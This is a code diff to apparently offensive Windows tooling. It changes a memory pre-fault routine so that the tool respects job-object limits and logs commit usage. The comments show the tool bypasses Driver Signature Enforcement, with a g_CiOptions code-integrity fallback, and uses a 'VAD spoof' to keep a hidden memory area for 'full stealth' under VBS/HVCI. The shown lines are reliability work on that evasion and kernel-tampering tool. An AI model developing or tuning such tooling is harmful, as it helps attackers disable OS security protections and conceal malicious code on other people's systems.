@@ -164,15 +164,41 @@ static void PrefaultWindow() {
         haveBudget = true;
     }
 
-    // The DSE phase afterwards downloads a PDB and runs DIA over it, and the
-    // memory sweep needs room too, so keep a real margin instead of running the
-    // process right up against the limit. The cap keeps a long tail of commit
-    // free even on a machine with plenty of RAM: the VAD spoof only needs a
-    // *prefix* of the window, so a smaller prefix costs nothing but a smaller
-    // hidden area.
+    // The DSE phase and the structural g_CiOptions fallback both allocate, and
+    // under VBS/HVCI the headroom is noticeably smaller, so keep a large margin
+    // and cap the amount we claim outright. The VAD spoof only needs a *prefix*
+    // of the window resident, so a smaller prefix costs a smaller hidden area
+    // and nothing else.
     const ULONGLONG slack = 1024ULL << 20;
-    const ULONGLONG cap = 2ULL << 30;
+    const ULONGLONG cap = 1ULL << 30;
+
+    // A job object memory limit, if we are in one, can bind before the system's
+    // commit limit does - and then any allocation, including the CRT's, fails.
+    ULONGLONG jobLimit = 0;
+    {
+        BOOL inJob = FALSE;
+        if (IsProcessInJob(GetCurrentProcess(), NULL, &inJob) && inJob) {
+            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jl = {};
+            if (QueryInformationJobObject(GetCurrentProcess(),
+                                         JobObjectExtendedLimitInformation,
+                                         &jl, sizeof(jl), NULL) &&
+                (jl.BasicLimitInformation.LimitFlags & JOB_OBJECT_LIMIT_JOB_MEMORY)) {
+                jobLimit = (ULONGLONG)jl.JobMemoryLimit;
+                printf("[*] Job object memory limit: %llu MB\n", jobLimit / (1024 * 1024));
+            }
+        }
+    }
+
     ULONGLONG budget = (available > slack) ? available - slack : 0;
+    if (jobLimit) {
+        // JobMemoryLimit is a cap on total job memory, not a headroom figure, so
+        // only clamp if the cap alone is below what we were about to claim.
+        if (jobLimit / 2 < budget) {
+            budget = jobLimit / 2;
+            printf("[*] Clamping the pre-fault to %llu MB to stay under the job limit\n",
+                   budget >> 20);
+        }
+    }
     if (budget > cap) {
         budget = cap;
         printf("[*] Capping the pre-fault at %llu MB to leave commit headroom\n", budget >> 20);
@@ -227,6 +253,16 @@ static void PrefaultWindow() {
 
     printf("[+] Window pre-faulted: %u/%u chunks resident, %llu MB committed (%llu ms)\n",
            resident, g_ChunkCount, spent >> 20, GetTickCount64() - t0);
+
+    // Say what is left, so a later allocation failure can be read against it.
+    {
+        MEMORYSTATUSEX ms = { sizeof(ms) };
+        if (GlobalMemoryStatusEx(&ms))
+            printf("[*] commit now: %llu MB of %llu MB used, %llu MB still available\n",
+                   (ms.ullTotalPageFile - ms.ullAvailPageFile) / (1024 * 1024),
+                   ms.ullTotalPageFile / (1024 * 1024),
+                   ms.ullAvailPageFile / (1024 * 1024));
+    }
 
     if (resident == 0)
         printf("[-] Nothing could be pre-faulted, the VADs stay intact (raise the pagefile for full stealth)\n");
